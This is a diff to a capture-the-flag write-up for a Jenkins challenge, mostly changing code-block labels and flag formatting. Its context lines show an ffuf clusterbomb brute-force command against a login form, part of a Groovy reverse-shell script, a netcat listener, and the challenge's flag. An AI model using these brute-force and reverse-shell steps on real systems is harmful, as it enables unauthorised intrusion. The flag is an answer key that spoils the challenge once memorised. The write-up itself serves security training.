@@ -4,7 +4,7 @@ tags:
   - medium
   - ChallengeCreation
   - Jenkins
-modified: 2024-09-04T14:19:43+08:00
+modified: 2026-08-22T08:25:37+08:00
 ---
 ## Challenge Description
 
@@ -44,7 +44,7 @@ A good practice is to:
 
 1. Perform an Nmap scan to find which ports are open and what services are running.
 
-```bash
+```console
 ┌──(nepz㉿nepz)-[~]
 └─$ nmap -sC -p- -sV 10.10.1.133
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-10 10:25 +08
@@ -151,7 +151,7 @@ A clusterbomb attack is probably the best attack we can run right now, since we 
 
 6. To compile a list of usernames, we can use a short list like `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`. Remove any weird usernames that are probably not going to be valid, since we are aiming to have a short list of usernames and passwords (excessive attempts usually take a lot of time + may get flagged).
 
-```bash
+```console
 ┌──(nepz㉿nepz)-[~]
 └─$ cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt
 root
@@ -197,7 +197,7 @@ By removing usernames that are not relevant (e.g. `puppet`) in our context and i
 
 Instead, we are going to compile a list of top passwords from a few different wordlists, remove any duplicates, and supply our own target-specific passwords. This should give us the best chance of breaking in (as explained at the very top of this writeup).
 
-```bash
+```console
 ┌──(nepz㉿nepz)-[~]
 └─$ cat /usr/share/wordlists/rockyou.txt | head -n 10
 123456
@@ -245,7 +245,7 @@ The above shows the first 10 lines of 3 password wordlists:
 
 Many entries are repeated, so we will need to clean those up:
 
-```bash
+```console
 ┌──(nepz㉿nepz)-[~]
 └─$ cat /usr/share/wordlists/rockyou.txt | head -n 10 > passwords.txt
 
@@ -271,7 +271,7 @@ After removing duplicates, we should have a file containing a reasonable number 
 
 In this example, I have included `jenkins`, `Jenkins`, `jetty` and `Jetty`, as these keywords were found previously from the Nmap scan and manual information gathering.
 
-```bash
+```console
 ┌──(nepz㉿nepz)-[~]
 └─$ mousepad pw.txt
 
@@ -308,7 +308,7 @@ Note:
 - The `users.txt` entries will be substitued into the `FUZZUSER` placeholder value. The same concept applies for the passwords. 
 - `-fr "loginError"` is a filter that filters out any authentication errors, so that only successful attempts are displayed.
 
-```bash
+```console
 ┌──(nepz㉿nepz)-[~]
 └─$ ffuf -request req.txt -request-proto http -mode clusterbomb -w users.txt:FUZZUSER -w pw.txt:FUZZPASS -fr "loginError"
 
@@ -393,7 +393,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 12. By submitting an appropriate Groovy script, we should be able to receive a connection in a Netcat reverse shell (`nc -nvlp 4444`).
 
-```bash
+```console
 ┌──(nepz㉿nepz)-[~]
 └─$ nc -nvlp 4444
 listening on [any] 4444 ...
@@ -479,4 +479,5 @@ After setting the appropriate options and running the exploit module, we should 
 
 ![[Friendly-Butler-8.png]]
 
-Flag: `HNF25{fr1end1y_bUt13r_4t_y0ur_s3rv1c3}`
+> [!NOTE] Flag
+> HNF25{fr1end1y_bUt13r_4t_y0ur_s3rv1c3}
